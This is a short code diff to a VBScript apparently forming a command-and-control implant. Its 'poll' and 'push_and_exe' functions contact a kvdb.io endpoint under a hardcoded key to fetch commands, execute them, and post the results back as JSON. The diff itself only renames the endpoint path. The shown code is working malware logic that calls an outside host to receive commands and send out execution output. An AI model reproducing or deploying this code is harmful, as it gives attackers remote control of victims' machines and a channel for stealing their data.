@@ -54,7 +54,7 @@ function poll()
 		x=x+1
 		res="FQM3hbtRhm94tkaLXBm5kF"
 		res_key=res
-		updated_ep="https://kvdb.io/"&res_key&"/commands"
+		updated_ep="https://kvdb.io/"&res_key&"/hits"
 		URL=updated_ep
 		Set objXmlHttpMain = CreateObject("Msxml2.ServerXMLHTTP.6.0")
 		if proxy <> "" then
@@ -114,7 +114,7 @@ function push_and_exe(command,c_type)
 		Wscript.Echo "Execution result : " '+text
 		res="FQM3hbtRhm94tkaLXBm5kF"
 		res_key=res
-		updated_ep="https://kvdb.io/"&res_key&"/commands"
+		updated_ep="https://kvdb.io/"&res_key&"/hits"
 		strJSONToSend = "{""new_command"":0,""command"":"&command&", ""result"": "&text&"}"
 		URL=updated_ep
 		Set objXmlHttpMain = CreateObject("Msxml2.ServerXMLHTTP.6.0")
